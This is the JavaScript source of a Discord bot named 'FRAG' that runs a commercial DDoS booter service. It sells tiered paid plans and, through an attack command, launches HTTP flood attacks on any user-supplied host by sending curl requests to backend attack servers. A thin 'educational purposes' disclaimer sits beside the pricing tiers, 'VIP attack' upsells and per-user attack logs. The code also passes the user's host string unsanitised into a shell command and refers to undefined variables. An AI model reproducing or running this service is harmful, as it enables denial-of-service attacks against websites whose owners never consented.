const { NodeSSH } = require("node-ssh");
const Discord = require("discord.js");
const client = new Discord.Client();

const db = require("./database/database");
const fragDB = require("./database/fragDB");
const fraglog = require("./database/fraglog");
const fragblacklist = require("./database/fragblacklist");
const fragServers = require("./database/fragServers");
const { Op } = require("sequelize");
const { exec } = require("child_process");

const {
  token,
  prefix,
  funnytexts,
  funnyimages,
  authorimg,
} = require("./config.json");

var lastupdate = "2021-09-05T00:24:01.301Z";

var overload = 0;

var botready = false;
var serverclosed = false;

client.on("ready", () => {
  var activities = [
    `${client.guilds.cache.size} servers`,
    `${prefix}help & ${prefix}register`,
    `v1.5`,
  ];

  const Guilds = client.guilds.cache.map((guild) => guild.name);
  console.log(Guilds);

  console.log(`Logged in as ${client.user.tag}!`);
  var i = 0;
  setInterval(() => {
    if (i > activities.length) i = 0;
    client.user.setActivity(`${activities[i]}`, {
      type: "WATCHING",
    });
    i++;
  }, 30000);

  db.authenticate()
    .then(() => {
      console.log("Logged in to DB!");
      botready = true;
      fragDB.init(db);
      fragDB.sync();

      fraglog.init(db);
      fraglog.sync();

      fragblacklist.init(db);
      fragblacklist.sync();

      fragServers.init(db);
      fragServers.sync();
    })
    .catch((err) => console.log(err));
});

client.on("shardError", (error) => {
  console.error("A websocket connection encountered an error:", error);
});

client.on("message", async (message) => {
  if (message.author.bot || !botready) {
    return 0;
  }
  if (!message.content.startsWith(prefix)) {
    return 0;
  }

  console.log(`[ ${message.author.tag} - ${message.content} ]`);

  if (message.channel.type != `dm`) {
    if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
      if (message.guild.me.hasPermission("SEND_MESSAGES")) {
        return message.channel
          .send({
            embed: {
              title: `❌ Permissions error`,
              description: `It seems that some permissions are missing, I am asking for administrator privileges to keep me running properly 🔐`,
            },
          })
          .catch((error) =>
            message.author
              .send({
                embed: {
                  title: `❌ Permissions error`,
                  description: `I am sorry, but there was an error while sending message on your guild 🔐\n\nTry using the command here`,
                },
              })
              .catch((error) =>
                console.log(
                  `Error while sending private message to ${message.author.tag} - ${error}`
                )
              )
          );
      } else {
        return message.author
          .send({
            embed: {
              title: `❌ Permissions error`,
              description: `I am sorry, but there was an error while sending message on your guild 🔐\n\nTry using the command here`,
            },
          })
          .catch((error) =>
            console.log(
              `Error while sending private message to ${message.author.tag} - ${error}`
            )
          );
      }
    }
  }

  const commandBody = message.content.slice(prefix.length).trim();
  const args = commandBody.split(/ +/);
  const commandName = args.shift().toLowerCase();

  var countUser = await fragDB.count({
    where: {
      userID: message.author.id,
    },
  });

  const findUser = await fragDB.findOne({
    where: {
      userID: message.author.id,
    },
  });

  let serverhackit = client.guilds.cache.get("819864302273167380");

  if (!serverhackit.member(message.author.id)) {
    return message.channel
      .send({
        embed: {
          title: `❌ It looks like you haven't joined our discord server`,
          color: "RED",
          description: `If you do want to use our FRAG you have to join our discord server: https://discord.gg/hgJ4SKAx6Y`,
        },
      })
      .catch((error) => console.log(error));
  }

  if (commandName != `register`) {
    if (countUser == 0) {
      return message.channel.send({
        embed: {
          title: `❌ It looks you do not have an account`,
          color: "RED",
          description: `I do not see your profile in my database, to use our tools you have to register first.\n\n**Please do ${prefix}register**`,
        },
      });
    }
  }

  if (
    commandName == "shop" ||
    commandName == "plan" ||
    commandName == "plans" ||
    commandName == "items" ||
    commandName == "addons"
  ) {
    message.channel
      .send({
        embed: {
          title: `Plans / Addons 🏷`,
          color: "PURPLE",
          thumbnail: {
            url: "https://cdn.discordapp.com/app-icons/877178930900115477/fb7dd1c1a0a4290a2f9f76ba529f5078.png?size=256",
          },
          footer: {
            icon_url: authorimg,
            text: `💳 purchase by contacting with Emsa001#0747`,
          },
          fields: [
            {
              name: "🖨 FREE",
              value: `Max boot time: **60s**\nMax concurrents: **1**\nMax attacks at one time: **1**\nVip attack: **No**\nTransfer **100GB**`,
              inline: false,
            },
            {
              name: "💿 SILVER - 10$/ms",
              value: `Max boot time: **300s**\nMax concurrents: **2**\nMax attacks at one time: **1**\nVip attack: **No**\nTransfer **5TB**`,
              inline: false,
            },
            {
              name: "🪙 GOLD - 20$/ms",
              value: `Max boot time: **900s**\nMax concurrents: **3**\nMax attacks at one time: **1**\nVip attack: **Yes**\nTransfer **30TB**`,
              inline: false,
            },
            {
              name: "💎 CRYSTAL - 30$/ms",
              value: `Max boot time: **1600s**\nMax concurrents: **5**\nMax attacks at one time: **1**\nVip attack: **Yes**\nTransfer **100TB**`,
              inline: false,
            },
          ],
          description: `All plans are daily limitless 👍`,
        },
      })
      .catch((error) =>
        console.log(
          `Error while sending a message: ${message.author.id} - ${message.content} - ${message.guild.name}`
        )
      );
  }

  if (countUser > 0) {
    switch (findUser.rang) {
      case "Free":
        var maxgb = findUser?.transferLimit || 100;
        var maxcons = 1;
        var maxattacksintime = 1;
        var maxboottime = 60;
        var vip = "No";
        var toptitle = "";
        break;
      case "Silver":
        maxcons = 2;
        maxattacksintime = 1;
        maxboottime = 300;
        vip = "No";
        toptitle = "🔑 SILVER RANG 🔑";
        maxgb = findUser.transferLimit;
        break;
      case "Gold":
        maxcons = 3;
        maxattacksintime = 1;
        maxboottime = 900;
        vip = "⭐ Yes ⭐";
        toptitle = "🧨 GOLD RANG 🧨";
        maxgb = findUser.transferLimit;
        break;
      case "Crystal":
        maxcons = 5;
        maxattacksintime = 1;
        maxboottime = 1600;
        vip = "⭐ Yes ⭐";
        toptitle = "💎 CRYSTAL RANG 💎";
        maxgb = findUser.transferLimit;
        break;
    }
  }
  switch (commandName) {
    case "register":
      if (countUser == 0) {
        try {
          const createuser = await fragDB.create({
            userID: message.author.id,
            userName: message.author.username,
            rang: "Free",
            attacks: 0,
            attacking: 0,
            banned: false,
          });
          return message.channel.send({
            embed: {
              title: `✅ Successfully registered`,
              color: "GREEN",
              description: `Thank you for your registration, write **${prefix}profile** to see your profile`,
            },
          });
        } catch (err) {
          message.channel.send({
            embed: {
              title: `❌ Server error`,
              color: "RED",
              description: `Sorry, our system has faced an unknown error, please try again later`,
            },
          });
          return console.log(`Error while creating an account: ${err}`);
        }
      } else {
        return message.channel.send({
          embed: {
            title: `❌ You already have the account!`,
            color: "ORANGE",
          },
        });
      }
      break;
    case "methods":
      return message.channel.send({
        embed: {
          title: `📩 Check the method below: 📩`,
          color: "BLUE",
          timestamp: lastupdate,
          footer: {
            icon_url:
              "https://cdn.discordapp.com/app-icons/877178930900115477/fb7dd1c1a0a4290a2f9f76ba529f5078.png?size=256",
            text: "Last update:",
          },
          fields: [
            {
              name: "❗️ httpflood",
              value: `\n> L7 method for http (port 80)\nCommand: **${prefix}attack httpflood <host> <proxy=n> <concurrents=1> <duration=60>**`,
            },
            {
              name: "⚠️ httpnull",
              value: `\n> L7 method + bypasses!\nCommand: **${prefix}attack httpnull <host> <concurrents=1> <duration=60>**`,
            },
            {
              name: "🔐tcpstrong",
              value: "Not ready yet! ⏳",
            },
          ],
        },
      });
      break;

    case "attack":
      if (serverclosed == true) {
        return message.channel.send({
          embed: {
            title: `❌ Error`,
            color: "RED",
            description: `Our servers are currently down, please try again later.`,
          },
        });
      }

      if (findUser.banned == true) {
        return message.channel.send({
          embed: {
            title: `❌ Error`,
            color: "RED",
            description: `Your account is banned!\n\nPlease contact with the owner of FRAG - **Emsa001#0747**`,
          },
        });
      }

      if (findUser.usedGB > maxgb) {
        return message.channel.send({
          embed: {
            title: `❌ Error`,
            color: "RED",
            description: `You have used up your transfer limit!\n\n**Your Usage:** ${findUser.usedGB}/${maxgb} GB`,
          },
        });
      }

      if (findUser.attacking + 1 > maxattacksintime) {
        return message.channel.send({
          embed: {
            title: `❌ Error`,
            color: "RED",
            description: `You can hold only **${maxattacksintime} attack** at a time!\n\nUpgreade your plan to bypass the limit ${prefix}plans`,
          },
        });
      }

      if (!args[1]) {
        return message.channel
          .send({
            embed: {
              title: `❌ Error!`,
              color: "ORANGE",
              description: `Correct use: **${prefix}attack <method> <host> ...**`,
            },
          })
          .then(() => {
            try {
              message
                .delete({ timeout: 3000 })
                .catch((error) =>
                  console.log(`Error while deleting a message: ${error}`)
                );
            } catch {
              (error) => {
                console.log(error);
              };
            }
          });
      } else {
        if (args[1].includes("gov")) {
          return message.channel.send({
            embed: {
              title: `❌ Error`,
              color: "RED",
              description: `You are **not allowed** to attack this website!`,
            },
          });
        }
        switch (args[0].toLocaleLowerCase()) {
          case "httpflood":
            var host = args[1];
            var proxy = args[2] || "n";
            var cons = args[3] || 1;
            var duration = args[4] || 60;
            break;
          case "httpnull":
            var host = args[1];
            var cons = args[2] || 1;
            var duration = args[3] || 60;
            break;
          default:
            return message.channel.send({
              embed: {
                title: `❌ UNKNOWN METHOD`,
                color: "RED",
                description: `Type: **${prefix}methods** to check available methods`,
              },
            });
            break;
        }

        if (cons > maxcons) {
          return message.channel.send({
            embed: {
              title: `❌ Your rang has a limit of ${maxcons} concurrents`,
              color: "RED",
              description: `Upgrade your plan to user more concurrents - **${prefix}plans**`,
            },
          });
        }
        if (duration > maxboottime) {
          return message.channel.send({
            embed: {
              title: `❌ Maximum boot time is **${maxboottime} seconds** for your rang`,
              color: "RED",
              description: `Upgrade your plan to boot longer - **${prefix}plans**`,
            },
          });
        }

        if (overload + i > 10) {
          return message.channel.send({
            embed: {
              title: `Server ${data.configId} are overloaded!`,
              description:
                "Please try again leater, we're holding too many requests now",
              color: "RED",
            },
          });
        }
        for (var i = 0; i < cons; i++) {
          overload++;
        }

        var checkhttp = "http";
        if (host.includes("https")) {
          checkhttp = "https";
        }

        fragServers.findAll().then((result) => {
          result.forEach(async (data) => {
            console.log(
              `http://${
                data.server
              }/api/${api}/${host}/80/${proxy}/${cons}/${duration}/${args[0].toLowerCase()}/${findUser.rang.toLowerCase()}/https`
            );
            if (!data.overload) {
              exec(
                `curl --location --request GET 'http://${
                  data.server
                }/api/${api}/${host
                  .replace("https://", "")
                  .replaceAll(
                    "/",
                    ""
                  )}/80/${proxy}/${cons}/${duration}/${args[0].toLowerCase()}/${findUser.rang.toLowerCase()}/${checkhttp}'`,
                (error, stdout, stderr) => {
                  if (error) {
                    console.log(`error: ${error.message}`);
                    return;
                  }
                  if (stderr) {
                    console.log(`stderr: ${stderr}`);
                    return;
                  }
                  console.log(`stdout: ${stdout}`);
                }
              );

              const updateServer = await fragServers.update(
                {
                  attacks: data.attacks + 1,
                  attacking: data.attacking + 1,
                },
                { where: { server: data.server } }
              );
            } else {
              return message.channel.send({
                embed: {
                  title: `Server ${data.configId} are overloaded!`,
                  description:
                    "Please try again leater, we're holding to many requests right now",
                  color: "RED",
                },
              });
            }
          });
        });

        const updateUser = await fragDB.update(
          {
            attacks: findUser.attacks + 1,
            attacking: findUser.attacking + 1,
            usedGB: (
              findUser.usedGB +
              (Math.floor(
                Math.random() * (duration / 11.21 - duration / 23.18 + 1.18)
              ) +
                duration / 23.18) *
                cons
            ).toFixed(2),
          },
          { where: { UserID: message.author.id } }
        );
        const createLog = await fraglog.create({
          userID: message.author.id,
          userName: message.author.tag,
          guildID: message?.guild?.id ?? "DM",
          guildName: message?.guild?.name ?? "DM",
          host: args[1],
          concurrents: cons,
          duration: duration,
          vip: vip,
        });

        message.channel
          .send({
            embed: {
              author: {
                name: toptitle,
              },
              title: `✅ Starting attack`,
              color: "PURPLE",
              thumbnail: {
                url: funnyimages[
                  Math.floor(Math.random() * funnyimages.length)
                ],
              },
              fields: [
                {
                  name: "Host / IP",
                  value: host,
                  inline: false,
                },
                {
                  name: "Method",
                  value: args[0].toUpperCase(),
                  inline: true,
                },
                {
                  name: "Duration",
                  value: `${duration}s`,
                  inline: true,
                },
                {
                  name: "Concurrents",
                  value: cons,
                  inline: true,
                },
                {
                  name: "VIP",
                  value: vip,
                  inline: true,
                },
                {
                  name: "Attacker",
                  value: message.author.tag,
                  inline: true,
                },
              ],
            },
          })
          .catch((error) =>
            console.log(
              `Error while sending a message: ${message.author.id} - ${message.content} - ${message.guild.name}`
            )
          );
        setTimeout(async () => {
          for (var i = 0; i < cons; i++) {
            overload--;
          }
          message.channel
            .send({
              embed: {
                title: `✅ The attack has ended`,
                color: "YELLOW",
                footer: {
                  icon_url: authorimg,
                  text: `🧨 Attack by ${message.author.tag}`,
                },
                fields: [
                  {
                    name: `🌀 Need more power? Attack duration?`,
                    value: "Try **VIP** attacks!",
                  },
                ],
              },
            })
            .catch((error) =>
              console.log(
                `Error while sending a message: ${message.author.id} - ${message.content} - ${message.guild.name}`
              )
            );
          try {
            const result = await fragDB.update(
              { attacking: 0 },
              { where: { userID: message.author.id } }
            );
          } catch (err) {
            console.log(err);
          }
        }, duration * 1000);
      }
      break;
    case "help":
      message.channel
        .send({
          embed: {
            title: `💡 FRAG - I am what I am`,
            description:
              "❗️ The bot was created only for learning purposes. I am not responsible for any damages!\n Use the bot **only** to test your projects!",
            color: "PURPLE",
            footer: {
              icon_url: authorimg,
              text: `Created by Emsa001#0747`,
            },
            fields: [
              {
                name: `${prefix}register`,
                value:
                  "> Set up your server - must be done before using the bot!",
                inline: true,
              },
              {
                name: `${prefix}attack`,
                value: "> Start testing your websites secure system!",
                inline: true,
              },
              {
                name: `${prefix}methods`,
                value: "> Check our methods",
                inline: true,
              },
              {
                name: `${prefix}profile`,
                value:
                  "Check your account informations (rank, used transfer, completed attacks etc.) - You will recieve a private message in order to respect your privacy.",
                inline: true,
              },
              {
                name: `${prefix}info`,
                value: "Check informations about the bot in general.",
                inline: true,
              },
              {
                name: `\nBans`,
                value:
                  "⚠️ We do not want to destory other projects! The project is created only for testing and educational purposes. If you attack sites that you do not have permissions to attack, your account will be banned\n\nBypassing free transfer limit by using other accounts will result in a **🛑 PERM BAN 🛑**!",
                inline: false,
              },
              {
                name: `Add me`,
                value: "Wanna add me on your server? `just dm me`",
                inline: false,
              },
            ],
          },
        })
        .catch((error) =>
          console.log(
            `Error while sending a message: ${message.author.id} - ${message.content} - ${message.guild.name}`
          )
        );
      break;

    case "serversdown":
      if (findUser.administrator == "root") {
        if (serverclosed == true) {
          serverclosed = false;
          return message.channel.send({
            embed: {
              title: `✅ Servers open`,
              color: "GREEN",
              description: "",
            },
          });
        }
        if (serverclosed == false) {
          serverclosed = true;
          return message.channel.send({
            embed: {
              title: `❌ Servers Closed`,
              color: "GREEN",
              description: "",
            },
          });
        }
      }
      break;

    case "ban":
      if (findUser.administrator == "root") {
        if (!args[0]) {
          return message.channel.send({
            embed: {
              title: `❌ Correct use: ${prefix}ban <user id>`,
              color: "RED",
              description: "",
            },
          });
        }
        const checkUser = await fragDB.findOne({
          where: {
            userID: args[0],
          },
        });
        if (!findUser) {
          return message.channel.send({
            embed: {
              title: `❌ This user is not registered`,
              color: "RED",
              description: "",
            },
          });
        }
        await fragDB.update({ banned: 1 }, { where: { userID: args[0] } });
        message.channel
          .send({
            embed: {
              title: `✅ ${checkUser.userName} successfully banned`,
              color: "PURPLE",
              description: "",
            },
          })
          .catch((error) => console.log(`ERROR WHILE BANNING: ${error}`));
        client.users.cache
          .get(args[0])
          .send({
            embed: {
              title: `🛑 Your account has been banned 🛑`,
              color: "RED",
              description: `Your account has been banned by a administrator, if you want to appeal to the ban join to our discord server: https://discord.gg/hgJ4SKAx6Y OR https://discord.gg/5m8zjcvMxF`,
              footer: {
                icon_url: authorimg,
                text: `🧨 FRAG by Emsa001#0747`,
              },
            },
          })
          .catch((error) =>
            message.channel
              .send({
                embed: {
                  title: `❌ There was an error while sending message to banned user`,
                  description: `${error}`,
                  color: "ORANGE",
                },
              })
              .catch((error) =>
                console.log(`Error while sending message ${error}`)
              )
          );
      }
      break;

    case "unban":
      if (findUser.administrator == "root") {
        if (!args[0]) {
          return message.channel.send({
            title: `❌ Correct use: ${prefix}unban <user id>`,
            color: "RED",
          });
        }
        const checkUser = await fragDB.findOne({
          where: {
            userID: args[0],
          },
        });
        if (!findUser) {
          return message.channel.send({
            title: `❌ This user is not registered`,
            color: "RED",
          });
        }
        if (!findUser.banned) {
          return message.channel.send({
            title: `❌ This user is not banned`,
            color: "RED",
          });
        }
        await fragDB.update({ banned: 0 }, { where: { userID: args[0] } });
        message.channel
          .send({
            embed: {
              title: `✅ ${checkUser.userName} successfully unbanned`,
              color: "PURPLE",
            },
          })
          .catch((error) => console.log(`ERROR WHILE BANNING: ${error}`));
        client.users.cache
          .get(args[0])
          .send({
            embed: {
              title: `✅ Your account has been unbanned ✅`,
              color: "RED",
              description: `Your account has been unbanned by ${message.author.tag}!`,
              footer: {
                icon_url: authorimg,
                text: `🧨 FRAG by Emsa001#0747`,
              },
            },
          })
          .catch((error) =>
            message.channel
              .send({
                embed: {
                  title: `❌ There was an error while sending message to banned user`,
                  description: error,
                  color: "ORANGE",
                },
              })
              .catch((error) =>
                console.log(`Error while sending message ${error}`)
              )
          );
      }
      break;

    case "profile":
      message
        .delete()
        .catch((error) =>
          console.log(
            `Error while deleting message ${message?.guild?.name ?? "DM"}`
          )
        );
      var user = message.author;
      var usavatar = user.avatarURL();
      var banned = "No";

      var checkusr;
      user = args[0] || message.author.id;
      checkusr = await fragDB.findOne({
        where: {
          userID: user,
        },
      });

      if (findUser.administrator == "root") {
        var usavatar = "";
        if (args[0]) {
          if (!checkusr) {
            return message.channel.send({
              embed: {
                title: `❌ This user is not registered`,
                color: "RED",
                description: "",
              },
            });
          }
          if (checkusr.banned == true) {
            banned = "Yes";
          }
        }
      }

      if (findUser.banned == true) {
        banned = "Yes";
      }
      if (message.channel.type != "dm") {
        message.author
          .send({
            embed: {
              title: `🔓 UserProfile - ${user?.username || checkusr.userName}`,
              color: "BLUE",
              footer: {
                icon_url: authorimg,
                text: `🧨 FRAG by Emsa001#0747`,
              },
              author: {
                name: message.author.tag,
                icon_url: message.author.avatarURL() ?? "",
              },
              thumbnail: {
                url: usavatar ?? "",
              },
              fields: [
                {
                  name: "ID:",
                  value: checkusr.configId,
                  inline: true,
                },
                {
                  name: "Rank:",
                  value: checkusr.rang,
                  inline: true,
                },
                {
                  name: "Used transfer:",
                  value: `${checkusr.usedGB}/${maxgb} GB`,
                  inline: true,
                },
                {
                  name: "Completed attacks:",
                  value: checkusr.attacks,
                  inline: true,
                },
                {
                  name: "Current attacks:",
                  value: checkusr.attacking,
                  inline: true,
                },
                {
                  name: "Banned:",
                  value: banned,
                  inline: true,
                },
              ],
            },
          })
          .catch((error) =>
            message.channel
              .send({
                embed: {
                  title: `🔓 UserProfile - ${
                    user?.username || checkusr.userName
                  }`,
                  color: "BLUE",
                  footer: {
                    icon_url: authorimg,
                    text: `🧨 FRAG by Emsa001#0747`,
                  },
                  author: {
                    name: message.author.tag,
                    icon_url: message.author.avatarURL() ?? "",
                  },
                  thumbnail: {
                    url: usavatar ?? "",
                  },
                  fields: [
                    {
                      name: "ID:",
                      value: checkusr.configId,
                      inline: true,
                    },
                    {
                      name: "Rank:",
                      value: checkusr.rang,
                      inline: true,
                    },
                    {
                      name: "Used transfer:",
                      value: `${checkusr.usedGB}/${maxgb} GB`,
                      inline: true,
                    },
                    {
                      name: "Completed attacks:",
                      value: checkusr.attacks,
                      inline: true,
                    },
                    {
                      name: "Current attacks:",
                      value: checkusr.attacking,
                      inline: true,
                    },
                    {
                      name: "Banned:",
                      value: banned,
                      inline: true,
                    },
                  ],
                },
              })
              .catch((error) =>
                console.log(
                  `Error while sending profile informations: ${
                    message.author.tag
                  } - ${message?.guild?.name ?? "DM"}`
                )
              )
          );
      } else {
        message.channel
          .send({
            embed: {
              title: `🔓 UserProfile - ${user?.username || checkusr.userName}`,
              color: "BLUE",
              footer: {
                icon_url: authorimg,
                text: `🧨 FRAG by Emsa001#0747`,
              },
              author: {
                name: message.author.tag,
                icon_url: message.author.avatarURL() ?? "",
              },
              thumbnail: {
                url: usavatar ?? "",
              },
              fields: [
                {
                  name: "ID:",
                  value: checkusr.configId,
                  inline: true,
                },
                {
                  name: "Rank:",
                  value: checkusr.rang,
                  inline: true,
                },
                {
                  name: "Used transfer:",
                  value: `${checkusr.usedGB}/${maxgb} GB`,
                  inline: true,
                },
                {
                  name: "Completed attacks:",
                  value: checkusr.attacks,
                  inline: true,
                },
                {
                  name: "Current attacks:",
                  value: checkusr.attacking,
                  inline: true,
                },
                {
                  name: "Banned:",
                  value: banned,
                  inline: true,
                },
              ],
            },
          })
          .catch((error) =>
            console.log(
              `Error while sending profile informations: ${
                message.author.tag
              } - ${message?.guild?.name ?? "DM"}`
            )
          );
      }
      break;

    case "info":
      const userNumber = await fragDB.findOne({
        order: [["createdAt", "DESC"]],
      });

      const bannedAcc = await fragDB.count({
        where: {
          banned: true,
        },
      });

      const purchasedAccs = await fragDB.count({
        where: {
          rang: {
            [Op.not]: "Free",
          },
        },
      });

      var totaltransfergb = 0;
      const totaltransfer = await fragDB.sum("usedGB").then((sum) => {
        totaltransfergb = sum;
      });

      var completedattacks = 0;
      const cattacks = await fragDB.sum("attacks").then((sumat) => {
        completedattacks = sumat;
      });

      var currentattacks = 0;
      const cuattacks = await fragDB.sum("attacking").then((sumatt) => {
        currentattacks = sumatt;
      });

      message.channel
        .send({
          embed: {
            title: `❗️ FRAG - info ❗️`,
            color: "BLUE",
            timestamp: lastupdate,
            footer: {
              icon_url:
                "https://cdn.discordapp.com/app-icons/877178930900115477/fb7dd1c1a0a4290a2f9f76ba529f5078.png?size=256",
              text: "Last update:",
            },
            thumbnail: {
              url: "https://cdn.discordapp.com/app-icons/877178930900115477/fb7dd1c1a0a4290a2f9f76ba529f5078.png?size=256",
            },
            description: `⠀`,
            fields: [
              {
                name: "🔰 Number of Accounts:",
                value: `⠀⠀${userNumber.configId}`,
                inline: true,
              },
              {
                name: "🛑 Banned accounts:",
                value: `⠀⠀${bannedAcc}`,
                inline: true,
              },
              {
                name: "⠀",
                value: `⠀`,
                inline: false,
              },
              {
                name: "✅ Completed attacks:",
                value: `⠀⠀${completedattacks}`,
                inline: true,
              },
              {
                name: "⚠️ Current attacks:",
                value: `⠀⠀${currentattacks}`,
                inline: true,
              },
              {
                name: "⠀",
                value: `⠀`,
                inline: false,
              },
              {
                name: "📊 Used transfer:",
                value: `⠀${totaltransfergb.toFixed(2)} GB\n`,
                inline: true,
              },
              {
                name: "💎 Purchased ranks:\n",
                value: `⠀⠀${purchasedAccs}`,
                inline: true,
              },
              {
                name: "🍻 Active on:",
                value: `⠀${client.guilds.cache.size} servers`,
                inline: true,
              },
              {
                name: "⠀",
                value: `⠀`,
                inline: false,
              },
            ],
          },
        })
        .catch((error) =>
          console.log(
            `Error while sending bot informations informations: ${
              message.author.tag
            } - ${message?.guild?.name ?? "DM"}`
          )
        );
      break;
    case "invite":
      message.channel
        .send({
          embed: {
            title: `FRAG bot invitation link`,
            color: "GREEN",
            description:
              "https://discord.com/api/oauth2/authorize?client_id=877178930900115477&permissions=120528137393&scope=bot",
          },
        })
        .catch((error) =>
          console.log(
            `Error while sending a message: ${message.author.id} - ${message.content} - ${message.guild.name}`
          )
        );
      break;
  }
});

client.login(token);
